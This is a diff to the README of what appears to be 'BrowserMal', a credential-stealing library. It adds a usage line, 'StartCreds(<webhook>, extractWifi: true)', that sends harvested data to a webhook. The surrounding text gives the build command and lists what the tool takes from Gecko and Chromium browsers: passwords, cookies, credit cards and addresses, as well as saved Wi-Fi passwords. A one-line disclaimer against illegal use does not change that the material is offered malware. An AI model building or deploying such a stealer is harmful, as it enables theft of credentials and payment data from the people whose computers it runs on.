@@ -7,6 +7,12 @@ Please do not use for illegal activities.
 ```
 ILMerge.exe /out:browser.mal.dll BrowserMal.dll BouncyCastle.Crypto.dll Newtonsoft.Json.dll 
 ```
+
+## Usage
+```
+BrowserMal.Class1.StartCreds(<webhook>, extractWifi: true);
+```
+
 ## Functionality
 - Extracts passwords, cookies, credit cards and addresses from gecko and chromium based browsers.
 - Extracts saved wifi passwords.
